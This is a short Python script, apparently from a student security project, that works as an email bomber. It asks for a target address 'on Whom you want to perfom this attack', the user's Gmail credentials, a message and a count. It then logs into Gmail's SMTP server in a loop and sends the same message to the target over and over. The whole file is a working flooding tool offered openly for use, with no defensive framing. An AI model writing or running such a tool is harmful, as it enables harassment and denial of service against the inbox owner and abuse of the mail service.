# Auteurs: Benjamin BEYERLE - Philippe DA SILVA OLIVEIRA - Karthike EZHILARASAN - Alexandre KOSTAS
# Classe: SRC1 - 3E
# Projet - ClicMed

import settings

try:
    bomb_email = input("Enter Email address on Whom you want to perfom this attack: ")
    email = input("Enter your gmail_address:")
    password = input("Enter your gmail_password:")
    message = input("Enter Message:")
    counter = int(input("How many message you want to send?:"))

    for x in range(0, counter):
        print("Number of Message Sent : ", x+1)
        mail = settings.smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(email, password)
        mail.sendmail(email, bomb_email, message)
        settings.time.sleep(1)
    mail.close()
except Exception as e:
    print("Something is wrong, please Re-try Again with Valid input.")

